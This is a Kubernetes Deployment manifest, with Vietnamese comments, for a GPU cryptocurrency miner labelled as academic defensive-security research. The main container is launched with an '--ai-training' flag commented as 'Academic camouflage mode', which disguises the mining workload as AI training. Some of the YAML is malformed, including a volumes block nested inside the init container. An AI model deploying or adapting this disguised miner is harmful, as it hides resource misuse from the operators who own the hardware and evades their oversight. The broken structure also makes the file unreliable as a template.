---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: gpu-miner
  namespace: gpu-mining-research
  labels:
    app: gpu-miner
    version: v0.1.0
    purpose: academic-research
    security-level: high
spec:
  replicas: 1  # Single replica để tránh mining conflicts
  strategy:
    type: Recreate  # Không cho phép overlapping replicas
  selector:
    matchLabels:
      app: gpu-miner
  template:
    metadata:
      labels:
        app: gpu-miner
        version: v0.1.0
        purpose: academic-research
        security-level: high

      annotations:
        # Security annotations
        seccomp.security.alpha.kubernetes.io/pod: localhost/seccomp-gpu-miner.json
        container.apparmor.security.beta.kubernetes.io/gpu-miner: localhost/apparmor-gpu-miner

        # Prometheus scraping
        prometheus.io/scrape: "true"
        prometheus.io/port: "9090"
        prometheus.io/path: "/metrics"

        # Academic research compliance
        compliance/research-purpose: "defensive-security"
        compliance/framework: "academic-research"

    spec:
      # Node selector đểGPU nodes
      nodeSelector:
        accelerator: nvidia-tesla-k80  # Hoặc GPU type tương ứng
        research-compute: "true"       # Academic research nodes only

      # Tolerations cho GPU workloads
      tolerations:
      - key: "nvidia.com/gpu"
        operator: "Exists"
        effect: "NoSchedule"

      # Service account với minimal permissions
      serviceAccountName: gpu-miner-sa

      # Security context
      securityContext:
        runAsNonRoot: true
        runAsUser: 1000
        runAsGroup: 1000
        fsGroup: 1000

        # Cgroups limits
        seccompProfile:
          type: Localhost
          localhostProfile: seccomp-gpu-miner.json

      # Affinity rules
      affinity:
        nodeAffinity:
          preferredDuringSchedulingIgnoredDuringExecution:
          - weight: 100
            preference:
              matchExpressions:
              - key: accelerator
                operator: In
                values:
                - nvidia-tesla-k80
                - nvidia-tesla-p100
                - nvidia-tesla-v100

        podAntiAffinity:
          preferredDuringSchedulingIgnoredDuringExecution:
          - weight: 100
            podAffinityTerm:
              labelSelector:
                matchExpressions:
                - key: app
                  operator: In
                  values:
                  - gpu-miner
              topologyKey: kubernetes.io/hostname

      # Resource limits - quan trọng cho security
      resources:
        limits:
          nvidia.com/gpu: 1      # 1 GPU per pod
          cpu: "2"               # Max 2 CPUs
          memory: "4Gi"          # Max 4GB RAM
        requests:
          nvidia.com/gpu: 1
          cpu: "1"
          memory: "2Gi"

      # Init container để verify GPU access
      initContainers:
      - name: gpu-verification
        image: nvidia/cuda:11.8-runtime-ubuntu22.04
        command:
        - /bin/sh
        - -c
        - |
          set -e
          echo "Verifying GPU access..."

          # Check NVIDIA drivers
          if ! nvidia-smi --query-gpu=name --format=csv,noheader,nounits; then
            echo "ERROR: GPU not accessible"
            exit 1
          fi

          # Check memory
          if ! nvidia-smi --query-gpu=memory.total --format=csv,noheader,nounits --id=0 | grep -q '[0-9]'; then
            echo "ERROR: GPU memory not accessible"
            exit 1
          fi

          echo "GPU verification successful"
        securityContext:
          runAsNonRoot: true
          runAsUser: 1000
          privileged: false
          allowPrivilegeEscalation: false
          readOnlyRootFilesystem: true
          capabilities:
            drop: ["ALL"]
        volumeMounts:
        - name: gpu-verification-tmp
          mountPath: /tmp
        resources:
          limits:
            nvidia.com/gpu: 1
        volumes:
        - name: gpu-verification-tmp
          emptyDir: {}

      # Main container
      containers:
      - name: gpu-miner
        image: ghcr.io/academic-research/gpu-miner:v0.1.0
        imagePullPolicy: Always

        # Command và args
        command: ["/app/entrypoint.sh"]
        args:
        - "--ai-training"          # Academic camouflage mode
        - "--telemetry-port=9090" # Prometheus metrics

        # Environment variables
        env:
        - name: NVIDIA_VISIBLE_DEVICES
          value: "0"  # GPU 0 only

        - name: RUST_LOG
          value: "info,tokio=warn,wgpu_hal=warn"

        - name: RUST_BACKTRACE
          value: "0"  # Production mode

        - name: RESEARCH_MODE
          value: "true"

        - name: COMPLIANCE_LEVEL
          value: "academic"

        # Resource limits (container level)
        resources:
          limits:
            nvidia.com/gpu: 1
            cpu: "2"
            memory: "4Gi"
          requests:
            nvidia.com/gpu: 1
            cpu: "1"
            memory: "2Gi"

        # Security context
        securityContext:
          runAsNonRoot: true
          runAsUser: 1000
          runAsGroup: 1000

          privileged: false
          allowPrivilegeEscalation: false
          readOnlyRootFilesystem: true

          capabilities:
            drop: ["ALL"]
            add: ["NET_BIND_SERVICE"]  # Cho Prometheus port

          # seccomp profile
          seccompProfile:
            type: Localhost
            localhostProfile: seccomp-gpu-miner.json

        # Health checks
        livenessProbe:
          httpGet:
            path: /health
            port: 9090
          initialDelaySeconds: 30
          periodSeconds: 30
          timeoutSeconds: 5
          failureThreshold: 3

        readinessProbe:
          httpGet:
            path: /health
            port: 9090
          initialDelaySeconds: 5
          periodSeconds: 10
          timeoutSeconds: 3
          failureThreshold: 3

        # Startup probe
        startupProbe:
          httpGet:
            path: /health
            port: 9090
          initialDelaySeconds: 10
          periodSeconds: 5
          timeoutSeconds: 3
          failureThreshold: 30  # Slower startup cho GPU init

        # Volume mounts
        volumeMounts:
        # Config
        - name: config
          mountPath: /app/config
          readOnly: true

        # Temporary working directory
        - name: tmp
          mountPath: /tmp

        # Security profiles
        - name: seccomp-profile
          mountPath: /var/lib/kubelet/seccomp/profiles
          readOnly: true

        # GPU devices (auto-mounted by K8s)
        # /dev/nvidia* devices sẽ được auto-mount

      # Volumes
      volumes:
      - name: config
        configMap:
          name: gpu-miner-config
          defaultMode: 0644

      - name: tmp
        emptyDir:
          medium: Memory  # In-memory cho security

      - name: seccomp-profile
        configMap:
          name: gpu-miner-security-profiles
          defaultMode: 0644